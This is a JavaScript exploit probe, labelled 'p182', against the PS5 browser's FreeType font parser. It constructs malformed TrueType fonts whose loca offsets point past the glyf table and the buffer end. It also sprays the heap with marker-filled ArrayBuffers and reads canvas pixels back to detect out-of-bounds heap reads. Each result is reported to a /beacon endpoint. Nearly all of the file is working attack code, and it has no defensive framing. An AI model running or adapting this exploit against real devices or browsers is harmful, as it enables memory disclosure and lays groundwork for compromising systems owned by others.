// p182 -- Font parser OOB read via loca table manipulation
//
// V180A confirmed: PS5 FreeType accepts fonts with loca offsets past glyf.
// BUG FIX: Previous p182 used absolute offsets in loca instead of glyf-relative.
// FreeType calculates: stream_pos = glyf_table_offset + loca[glyph_index]
// So loca values MUST be relative to glyf table start.
//
// Strategy:
//   Test A: Baseline -- valid font renders triangle, capture pixel signature
//   Test B: Padding read -- extend buffer past glyf with known pattern,
//           set loca to point into the padding (still within buffer).
//           If rendering changes, FreeType reads data at that offset.
//   Test C: Cross-table -- loca points into another table's data (within buffer)
//   Test D: Heap OOB -- loca points past buffer end (true heap leak)
//   Test E: measureText -- compare advance widths between valid and OOB fonts
//   Test F: Heap spray + OOB -- spray known patterns, then tight-buffer OOB font
//
// Source analysis (FontCustomPlatformDataFreeType.cpp:135-148):
//   FT_New_Memory_Face(library, buffer.data(), buffer.size(), ...) -- size is exact
//   FreeType allocator = fastMalloc (lines 116-124) -- same bmalloc heap
//   No OTS sanitization on FontFace ArrayBuffer path
//
// Beacon prefix: V182-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    var url = '/beacon/V182-' + tag + '?t=' + (Date.now() - T0);
    try {
      navigator.sendBeacon(url, body || '');
    } catch(e) {}
  }
  function hex(v, n) {
    var s = (v >>> 0).toString(16);
    while (s.length < (n || 8)) s = '0' + s;
    return s;
  }

  B('BOOT');
  if (typeof FontFace === 'undefined') { B('NO-FONTFACE'); return; }
  B('API-OK');

  // ---- Font builder ----
  // Builds a minimal TrueType font with glyf as the LAST table in the buffer.
  // opts.locaOverride: [g0, g1, sentinel] -- glyf-relative offsets
  // opts.fontName: family name for FontFace
  // opts.padAfterGlyf: number of extra bytes to append after glyf (filled with pattern)
  // opts.padPattern: byte value to fill padding with (default 0xBB)
  function buildFont(opts) {
    opts = opts || {};
    var data = [];
    function w8(v) { data.push(v & 0xFF); }
    function w16(v) { data.push((v >> 8) & 0xFF, v & 0xFF); }
    function w32(v) { data.push((v >>> 24) & 0xFF, (v >>> 16) & 0xFF, (v >>> 8) & 0xFF, v & 0xFF); }
    function pad4() { while (data.length % 4) data.push(0); }

    // We write tables in this physical order so glyf is LAST:
    // head, hhea, hmtx, maxp, cmap, loca, name, post, glyf
    // But directory entries are alphabetically sorted by tag:
    // cmap(0), glyf(1), head(2), hhea(3), hmtx(4), loca(5), maxp(6), name(7), post(8)

    var numTables = 9;
    var dirTags = ['cmap','glyf','head','hhea','hmtx','loca','maxp','name','post'];
    var dirOffs = {};  // tag -> {offset, length} filled after building
    var dirIdxs = {};  // tag -> index in directory
    for (var i = 0; i < dirTags.length; i++) dirIdxs[dirTags[i]] = i;

    // -- sfnt header --
    w32(0x00010000); // version (TrueType)
    w16(numTables);
    // searchRange, entrySelector, rangeShift
    var sr = 1; while (sr * 2 <= numTables) sr *= 2; sr *= 16;
    w16(sr);
    var es = 0; var tmp = sr / 16; while (tmp > 1) { tmp >>= 1; es++; }
    w16(es);
    w16(numTables * 16 - sr);

    // -- Table directory (placeholder) --
    var dirBase = data.length;
    for (var t = 0; t < numTables; t++) {
      var tag = dirTags[t];
      data.push(tag.charCodeAt(0), tag.charCodeAt(1), tag.charCodeAt(2), tag.charCodeAt(3));
      w32(0); w32(0); w32(0); // checksum, offset, length
    }

    function setDirEntry(tag, offset, length) {
      var idx = dirIdxs[tag];
      var p = dirBase + idx * 16 + 4; // skip tag bytes
      // checksum (leave 0 for now)
      p += 4;
      // offset
      data[p]=(offset>>>24)&0xFF; data[p+1]=(offset>>>16)&0xFF;
      data[p+2]=(offset>>>8)&0xFF; data[p+3]=offset&0xFF;
      p += 4;
      // length
      data[p]=(length>>>24)&0xFF; data[p+1]=(length>>>16)&0xFF;
      data[p+2]=(length>>>8)&0xFF; data[p+3]=length&0xFF;
    }

    // -- head table (54 bytes) --
    var headOff = data.length;
    w32(0x00010000); w32(0x00005000); // version, fontRevision
    w32(0x00000000); w32(0x5F0F3CF5); // checksumAdj, magicNumber
    w16(0x000B); w16(1000); // flags, unitsPerEm
    w32(0); w32(0); w32(0); w32(0); // created, modified (16 bytes)
    w16(0); w16(0); w16(500); w16(700); // xMin, yMin, xMax, yMax
    w16(0); w16(8); w16(2); // macStyle, lowestRecPPEM, fontDirectionHint
    w16(1); // indexToLocFormat = 1 (long, 4 bytes per entry)
    w16(0); // glyphDataFormat
    pad4();
    setDirEntry('head', headOff, 54);

    // -- hhea table (36 bytes) --
    var hheaOff = data.length;
    w32(0x00010000); // version
    w16(800); // ascender
    w16(0xFE0C); // descender = -500 (signed)
    w16(0); // lineGap
    w16(600); // advanceWidthMax
    w16(0); w16(0); w16(600); // minLSB, minRSB, xMaxExtent
    w16(1); w16(0); w16(0); // caretSlopeRise, Run, Offset
    w16(0); w16(0); w16(0); w16(0); // reserved
    w16(0); // metricDataFormat
    w16(2); // numberOfHMetrics
    pad4();
    setDirEntry('hhea', hheaOff, 36);

    // -- hmtx table (8 bytes: 2 x {advanceWidth, lsb}) --
    var hmtxOff = data.length;
    w16(600); w16(0); // glyph 0: advance=600, lsb=0
    w16(600); w16(50); // glyph 1: advance=600, lsb=50
    pad4();
    setDirEntry('hmtx', hmtxOff, 8);

    // -- maxp table (32 bytes) --
    var maxpOff = data.length;
    w32(0x00010000); // version 1.0
    w16(2); // numGlyphs
    w16(4); w16(1); // maxPoints=4, maxContours=1
    w16(0); w16(0); // maxCompositePoints, Contours
    w16(1); // maxZones
    w16(0); w16(0); w16(0); // twilightPts, storage, funcDefs
    w16(0); w16(0); // instrDefs, stackElements
    w16(0); // maxSizeOfInstructions
    w16(0); w16(0); // componentElements, componentDepth
    pad4();
    setDirEntry('maxp', maxpOff, 32);

    // -- cmap table (format 4, maps 0x41='A' to glyph 1) --
    var cmapOff = data.length;
    w16(0); w16(1); // version, numTables
    w16(3); w16(1); w32(12); // platformID=3, encodingID=1, offset=12
    // Format 4 subtable, 2 segments (1 mapping + sentinel)
    var segCount = 2;
    w16(4); // format
    w16(14 + segCount * 8); // length of subtable
    w16(0); // language
    w16(segCount * 2); // segCountX2
    w16(4); w16(1); w16(0); // searchRange, entrySelector, rangeShift
    // endCode
    w16(0x0041); w16(0xFFFF);
    w16(0); // reservedPad
    // startCode
    w16(0x0041); w16(0xFFFF);
    // idDelta: maps 0x41 to glyph 1 via delta = 1 - 0x41 = -64
    w16((-64) & 0xFFFF); w16(1);
    // idRangeOffset
    w16(0); w16(0);
    pad4();
    setDirEntry('cmap', cmapOff, data.length - cmapOff);

    // -- loca table (long format: numGlyphs+1 entries = 3 x 4 bytes) --
    // These are offsets RELATIVE TO THE START of the glyf table.
    var locaOff = data.length;
    if (opts.locaOverride) {
      w32(opts.locaOverride[0]); // glyph 0 start
      w32(opts.locaOverride[1]); // glyph 1 start
      w32(opts.locaOverride[2]); // end sentinel
    } else {
      // Will be patched after building glyf
      w32(0); w32(0); w32(0);
    }
    pad4();
    setDirEntry('loca', locaOff, 12);

    // -- name table --
    var nameOff = data.length;
    var fontName = opts.fontName || 'P182Font';
    var nameBytes = [];
    for (var i = 0; i < fontName.length; i++) { nameBytes.push(0, fontName.charCodeAt(i)); }
    w16(0); // format
    w16(4); // count (4 name records)
    w16(6 + 4 * 12); // stringOffset
    var nameIDs = [1, 2, 4, 6];
    for (var n = 0; n < nameIDs.length; n++) {
      w16(3); w16(1); w16(0x0409); w16(nameIDs[n]);
      w16(nameBytes.length); w16(0);
    }
    for (var i = 0; i < nameBytes.length; i++) data.push(nameBytes[i]);
    pad4();
    setDirEntry('name', nameOff, data.length - nameOff);

    // -- post table (32 bytes, format 3.0) --
    var postOff = data.length;
    w32(0x00030000); w32(0); // format, italicAngle
    w16(0xFF9C); w16(50); // underlinePosition(-100), thickness
    w32(0); // isFixedPitch
    w32(0); w32(0); w32(0); w32(0); // min/maxMem
    pad4();
    setDirEntry('post', postOff, 32);

    // -- glyf table (LAST table in the buffer) --
    var glyfOff = data.length;

    // Glyph 0: .notdef -- empty glyph (0 contours)
    var g0RelOff = 0; // relative to glyf start
    w16(0); // numberOfContours = 0
    w16(0); w16(0); w16(0); w16(0); // bbox all zeros
    pad4();
    var g0End = data.length - glyfOff;

    // Glyph 1: triangle -- 1 contour, 3 on-curve points
    // Points: (50,0), (550,0), (300,650) using delta encoding
    var g1RelOff = data.length - glyfOff;
    w16(1); // numberOfContours
    w16(50); w16(0); w16(550); w16(650); // bbox
    w16(2); // endPtsOfContours[0] = 2 (indices: 0,1,2)
    w16(0); // instructionLength = 0

    // Flags: each point uses signed int16 x and y (not short-vector)
    // flag byte: bit0=onCurve(1), bits 1-2=0 (word coords), bits 4-5=0 (not same)
    // flag = 0x01 for on-curve, word-size, not-same
    w8(0x01); // point 0
    w8(0x01); // point 1
    w8(0x01); // point 2
    w8(0);    // padding to align

    // X deltas (int16): 50, +500, -250
    w16(50);               // x[0]: absolute first point x
    w16(500);              // x[1]: delta from 50 to 550
    w16((-250) & 0xFFFF);  // x[2]: delta from 550 to 300

    // Y deltas (int16): 0, 0, +650
    w16(0);                // y[0]: absolute first point y
    w16(0);                // y[1]: delta from 0 to 0
    w16(650);              // y[2]: delta from 0 to 650

    pad4();
    var glyfLen = data.length - glyfOff;
    var g1End = data.length - glyfOff;

    setDirEntry('glyf', glyfOff, glyfLen);

    // Patch default loca entries (if no override)
    if (!opts.locaOverride) {
      // glyph 0 offset (relative to glyf)
      data[locaOff] = 0; data[locaOff+1] = 0; data[locaOff+2] = 0; data[locaOff+3] = 0;
      // glyph 1 offset
      data[locaOff+4] = (g1RelOff>>>24)&0xFF; data[locaOff+5] = (g1RelOff>>>16)&0xFF;
      data[locaOff+6] = (g1RelOff>>>8)&0xFF;  data[locaOff+7] = g1RelOff&0xFF;
      // end sentinel
      data[locaOff+8] = (g1End>>>24)&0xFF;  data[locaOff+9] = (g1End>>>16)&0xFF;
      data[locaOff+10] = (g1End>>>8)&0xFF;   data[locaOff+11] = g1End&0xFF;
    }

    // -- Optional padding after glyf (for within-buffer OOB tests) --
    var padStart = data.length;
    if (opts.padAfterGlyf && opts.padAfterGlyf > 0) {
      var pattern = (opts.padPattern !== undefined) ? opts.padPattern : 0xBB;
      for (var i = 0; i < opts.padAfterGlyf; i++) {
        if (typeof pattern === 'function') {
          data.push(pattern(i) & 0xFF);
        } else {
          data.push(pattern & 0xFF);
        }
      }
    }

    // Convert to ArrayBuffer
    var totalLen = data.length;
    var ab = new ArrayBuffer(totalLen);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < totalLen; i++) u8[i] = data[i];

    return {
      buffer: ab,
      glyfOff: glyfOff,
      glyfLen: glyfLen,
      g1RelOff: g1RelOff,
      g1End: g1End,
      totalLen: totalLen,
      padStart: padStart
    };
  }

  // ---- Canvas render + readback ----
  var CW = 120, CH = 80;

  function renderAndRead(fontName, buf, text) {
    return new Promise(function(resolve, reject) {
      try {
        var face = new FontFace(fontName, buf);
        face.load().then(function(loaded) {
          document.fonts.add(loaded);

          var c = document.createElement('canvas');
          c.width = CW; c.height = CH;
          var ctx = c.getContext('2d');

          // Clear to white
          ctx.fillStyle = '#FFF';
          ctx.fillRect(0, 0, CW, CH);

          // Draw text in black
          ctx.fillStyle = '#000';
          ctx.font = '48px "' + fontName + '"';
          ctx.fillText(text || 'A', 10, 60);

          var imgData = ctx.getImageData(0, 0, CW, CH);

          // Also get measureText width
          var metrics = ctx.measureText(text || 'A');

          document.fonts.delete(loaded);

          resolve({
            pixels: imgData.data,
            width: metrics.width,
            fontName: fontName
          });
        }).catch(function(err) {
          reject(err);
        });
      } catch(e) {
        reject(e);
      }
    });
  }

  function pixelSignature(pixels) {
    // Fast signature: count non-white pixels, XOR hash of non-white pixel positions
    var count = 0, xorHash = 0, sumR = 0, sumG = 0, sumB = 0;
    for (var i = 0; i < pixels.length; i += 4) {
      if (pixels[i] < 255 || pixels[i+1] < 255 || pixels[i+2] < 255) {
        count++;
        xorHash = (xorHash ^ (i/4)) >>> 0;
        sumR += pixels[i];
        sumG += pixels[i+1];
        sumB += pixels[i+2];
      }
    }
    return {
      count: count,
      hash: xorHash,
      sumR: sumR,
      sumG: sumG,
      sumB: sumB
    };
  }

  function comparePixels(a, b) {
    var diffCount = 0, firstDiffPx = -1;
    var maxDiff = 0;
    var diffPositions = [];
    for (var i = 0; i < a.length && i < b.length; i += 4) {
      var dr = Math.abs(a[i] - b[i]);
      var dg = Math.abs(a[i+1] - b[i+1]);
      var db = Math.abs(a[i+2] - b[i+2]);
      var d = dr + dg + db;
      if (d > 0) {
        diffCount++;
        if (firstDiffPx < 0) firstDiffPx = i / 4;
        if (d > maxDiff) maxDiff = d;
        if (diffPositions.length < 5) {
          diffPositions.push(hex(i / 4, 4));
        }
      }
    }
    return {
      count: diffCount,
      first: firstDiffPx,
      maxDiff: maxDiff,
      positions: diffPositions.join(',')
    };
  }

  // ---- Test runner ----
  var baseResult = null;
  var testNum = 0;

  // Test A: Baseline
  B('TA-BASELINE');
  var baseFont = buildFont({ fontName: 'P182Base' });
  B('TA-BUILT-glyfOff' + baseFont.glyfOff + '-glyfLen' + baseFont.glyfLen + '-total' + baseFont.totalLen);

  renderAndRead('P182Base', baseFont.buffer, 'A').then(function(result) {
    baseResult = result;
    var sig = pixelSignature(result.pixels);
    B('TA-OK-px' + sig.count + '-h' + hex(sig.hash) + '-w' + Math.round(result.width));

    if (sig.count === 0) {
      B('TA-WARN-BLANK-GLYPH');
      // Glyph might not have rendered. Still continue tests.
    }

    return runTestB();
  }).catch(function(err) {
    B('TA-ERR-' + String(err).substring(0, 60));
    // Try tests anyway with null baseline
    return runTestB();
  });

  // Test B: Padded buffer OOB (within buffer, known pattern)
  // This confirms FreeType reads at the loca-specified offset within glyf space.
  // We put 256 bytes of pattern data after glyf. Then set loca to point glyph 1
  // at glyfLen+16 (16 bytes into the padding), so FreeType reads pattern bytes
  // as glyph outline data.
  function runTestB() {
    B('TB-PADDED-OOB');

    // Build font with 256 bytes of recognizable pattern after glyf
    // Pattern: repeating 0x00 0x01 0x00 0x02 ... simulating a 1-contour glyph
    // at the OOB offset so FreeType tries to parse it as a glyph
    var patternFn = function(i) {
      // Craft pattern that looks like a valid simple glyph header:
      // Bytes 0-1: numberOfContours = 1 (0x0001)
      // Bytes 2-9: bbox (50, 50, 200, 200)
      // Bytes 10-11: endPtsOfContours[0] = 2
      // Bytes 12-13: instructionLength = 0
      // Bytes 14-16: flags (3 on-curve points)
      // Bytes 17+: coordinate data
      var fakeGlyph = [
        0x00, 0x01, // numberOfContours = 1
        0x00, 0x32, 0x00, 0x32, 0x00, 0xC8, 0x00, 0xC8, // bbox 50,50,200,200
        0x00, 0x02, // endPtsOfContours[0] = 2
        0x00, 0x00, // instructionLength = 0
        0x01, 0x01, 0x01, 0x00, // flags (3 on-curve points + pad)
        0x00, 0x32, 0x00, 0x96, 0xFF, 0x38, // x deltas: 50, 150, -200
        0x00, 0x32, 0x00, 0x96, 0xFF, 0x38  // y deltas: 50, 150, -200
      ];
      if (i < fakeGlyph.length) return fakeGlyph[i];
      return 0x00;
    };

    var padSize = 256;
    var oobRelOff = baseFont.glyfLen; // points exactly at start of padding

    var paddedFont = buildFont({
      fontName: 'P182Pad',
      padAfterGlyf: padSize,
      padPattern: patternFn,
      locaOverride: [
        0,                              // glyph 0 at glyf start (valid)
        oobRelOff,                      // glyph 1 at padding start (OOB past glyf data)
        oobRelOff + 32                  // sentinel (32 bytes of glyph data)
      ]
    });

    B('TB-FONT-total' + paddedFont.totalLen + '-oobRel' + oobRelOff);

    renderAndRead('P182Pad', paddedFont.buffer, 'A').then(function(result) {
      var sig = pixelSignature(result.pixels);
      var cmp = baseResult ? comparePixels(baseResult.pixels, result.pixels) : null;
      B('TB-px' + sig.count + '-h' + hex(sig.hash) + '-w' + Math.round(result.width));
      if (cmp) {
        B('TB-DIFF' + cmp.count + '-max' + cmp.maxDiff + '-first' + cmp.first);
        if (cmp.count > 0) {
          B('TB-HIT-PADDING-READ');
        } else {
          B('TB-SAME-NO-OOB-RENDER');
        }
      }
      return runTestC();
    }).catch(function(err) {
      B('TB-ERR-' + String(err).substring(0, 60));
      return runTestC();
    });
  }

  // Test C: loca points past buffer entirely (true heap OOB)
  // Smaller offsets first, increasing to probe FreeType's bounds check.
  function runTestC() {
    B('TC-HEAP-OOB');

    var oobOffsets = [4, 16, 64, 256, 1024, 4096];
    var idx = 0;

    function nextOOB() {
      if (idx >= oobOffsets.length) {
        return runTestD();
      }

      var oobBytes = oobOffsets[idx];
      // loca value = glyfLen + oobBytes: points oobBytes past the glyf table end.
      // Since glyf is the LAST table and there's no padding, this is past the buffer.
      var locaVal = baseFont.glyfLen + oobBytes;
      var name = 'P182C' + idx;

      B('TC' + idx + '-oob' + oobBytes + '-loca' + locaVal);

      var oobFont = buildFont({
        fontName: name,
        locaOverride: [0, locaVal, locaVal + 32]
      });

      renderAndRead(name, oobFont.buffer, 'A').then(function(result) {
        var sig = pixelSignature(result.pixels);
        var cmp = baseResult ? comparePixels(baseResult.pixels, result.pixels) : null;
        B('TC' + idx + '-px' + sig.count + '-w' + Math.round(result.width));
        if (cmp) {
          B('TC' + idx + '-diff' + cmp.count);
          if (cmp.count > 0) {
            B('TC' + idx + '-HIT-HEAP-OOB-READ');
          }
        }
        idx++;
        setTimeout(nextOOB, 30);
      }).catch(function(err) {
        var msg = String(err).substring(0, 50);
        B('TC' + idx + '-REJECT-' + msg);
        idx++;
        setTimeout(nextOOB, 30);
      });
    }

    nextOOB();
  }

  // Test D: measureText width comparison
  // If FreeType reads OOB hmtx data, advance widths will differ from baseline.
  function runTestD() {
    B('TD-MEASURE-TEXT');

    try {
      // Build font with manipulated hhea.numberOfHMetrics
      // If set to a larger value, FreeType reads past hmtx table
      // This is a different OOB channel than loca

      // For this test, we use the baseline font and just compare measureText
      // between baseline and the padded-OOB font from test B
      var c = document.createElement('canvas');
      c.width = 100; c.height = 50;
      var ctx = c.getContext('2d');

      // Measure with default serif font for comparison
      ctx.font = '48px serif';
      var serifW = ctx.measureText('A').width;

      B('TD-SERIF-W' + Math.round(serifW * 100));
      if (baseResult) {
        B('TD-BASE-W' + Math.round(baseResult.width * 100));
      }
    } catch(e) {
      B('TD-ERR-' + String(e).substring(0, 50));
    }

    return runTestE();
  }

  // Test E: Heap spray + tight buffer OOB read
  // Spray the heap with ArrayBuffers containing a known marker pattern,
  // then load a tight font whose loca points past the buffer.
  // If FreeType reads the spray pattern and renders it as glyph data,
  // we'll see the marker in the pixel output.
  function runTestE() {
    B('TE-SPRAY-START');

    // Phase 1: Spray 1000 x 4KB ArrayBuffers with marker 0xDEAD pattern
    var SPRAY_SIZE = 4096;
    var SPRAY_COUNT = 1000;
    var sprays = [];

    for (var i = 0; i < SPRAY_COUNT; i++) {
      var ab = new ArrayBuffer(SPRAY_SIZE);
      var v32 = new Uint32Array(ab);
      for (var j = 0; j < v32.length; j++) {
        // Fill with a pattern that looks like a valid glyph:
        // First 32 bytes = fake glyph header + contour data
        // Rest = marker pattern
        if (j < 8) {
          // Fake glyph header at the start of each spray block
          var fakeGlyphU32 = [
            0x00010000, // contours=1, xMin=0
            0x00000190, // yMin=0, xMax=400
            0x02580002, // yMax=600, endPts[0]=2
            0x00000000, // instrLen=0, pad
            0x01010100, // flags (3 on-curve) + pad
            0x00640000, // x: 100, 0
            0xFF9C0064, // x: -100; y: 100
            0x01F40000  // y: 500, 0
          ];
          v32[j] = fakeGlyphU32[j];
        } else {
          v32[j] = (0xCAFE0000 | ((i * 1024 + j) & 0xFFFF)) >>> 0;
        }
      }
      sprays.push(ab);
    }
    B('TE-SPRAYED-' + SPRAY_COUNT);

    // Phase 2: Build tight font (no padding), loca points past buffer
    // The font buffer will be allocated by SharedBuffer (via fastMalloc/bmalloc).
    // Adjacent heap memory should be our spray buffers.
    var sprayTestOffsets = [0, 64, 128, 256, 512, 1024, 2048];
    var sprayIdx = 0;

    function nextSprayTest() {
      if (sprayIdx >= sprayTestOffsets.length) {
        B('TE-DONE');
        sprays = null; // release spray
        return runTestF();
      }

      var oobPast = sprayTestOffsets[sprayIdx];
      var locaVal = baseFont.glyfLen + oobPast;
      var name = 'P182E' + sprayIdx;

      B('TE' + sprayIdx + '-oob' + oobPast);

      var tightFont = buildFont({
        fontName: name,
        locaOverride: [0, locaVal, locaVal + 32]
      });

      renderAndRead(name, tightFont.buffer, 'A').then(function(result) {
        var sig = pixelSignature(result.pixels);
        var cmp = baseResult ? comparePixels(baseResult.pixels, result.pixels) : null;
        B('TE' + sprayIdx + '-px' + sig.count + '-w' + Math.round(result.width));
        if (cmp && cmp.count > 0) {
          B('TE' + sprayIdx + '-HIT-diff' + cmp.count);

          // Check for spray marker in rendered pixels
          // The alpha channel (every 4th byte) might encode heap data
          var markerFound = false;
          for (var p = 0; p < result.pixels.length - 8; p += 4) {
            var r = result.pixels[p], g = result.pixels[p+1];
            if (r === 0xCA && g === 0xFE) {
              B('TE' + sprayIdx + '-MARKER-AT-PX' + (p/4));
              markerFound = true;
              break;
            }
          }
          if (!markerFound) {
            // Dump first few differing pixels for analysis
            var dump = [];
            var dumpCount = 0;
            for (var p = 0; p < result.pixels.length && dumpCount < 10; p += 4) {
              if (baseResult && (result.pixels[p] !== baseResult.pixels[p] ||
                  result.pixels[p+1] !== baseResult.pixels[p+1] ||
                  result.pixels[p+2] !== baseResult.pixels[p+2])) {
                dump.push(hex(p/4, 4) + ':' +
                          hex(result.pixels[p], 2) + hex(result.pixels[p+1], 2) +
                          hex(result.pixels[p+2], 2));
                dumpCount++;
              }
            }
            if (dump.length > 0) {
              B('TE' + sprayIdx + '-PX', dump.join(' '));
            }
          }
        }

        sprayIdx++;
        setTimeout(nextSprayTest, 50);
      }).catch(function(err) {
        B('TE' + sprayIdx + '-REJECT-' + String(err).substring(0, 40));
        sprayIdx++;
        setTimeout(nextSprayTest, 50);
      });
    }

    nextSprayTest();
  }

  // Test F: Alternative channel -- render glyph 0 (.notdef) with OOB loca
  // glyph 0 is automatically rendered for unmapped characters.
  // Set loca[0] to point OOB (past buffer) and render 'Z' (unmapped).
  function runTestF() {
    B('TF-NOTDEF-OOB');

    // loca[0] = OOB (past buffer), loca[1] = valid, loca[2] = sentinel
    var locaVal = baseFont.glyfLen + 512;
    var tightFont = buildFont({
      fontName: 'P182F',
      locaOverride: [locaVal, baseFont.g1RelOff, baseFont.g1End]
    });

    // Render 'Z' which maps to .notdef (glyph 0) since only 'A' is mapped
    renderAndRead('P182F', tightFont.buffer, 'Z').then(function(result) {
      var sig = pixelSignature(result.pixels);
      B('TF-px' + sig.count + '-w' + Math.round(result.width));

      // Compare to rendering 'Z' with baseline font
      return renderAndRead('P182Base2', buildFont({fontName: 'P182Base2'}).buffer, 'Z').then(function(baseZ) {
        var cmp = comparePixels(baseZ.pixels, result.pixels);
        B('TF-diff' + cmp.count + '-max' + cmp.maxDiff);
        if (cmp.count > 0) {
          B('TF-HIT-NOTDEF-OOB');
        }
        B('ALL-COMPLETE');
      });
    }).catch(function(err) {
      B('TF-ERR-' + String(err).substring(0, 50));
      B('ALL-COMPLETE');
    });
  }
})();
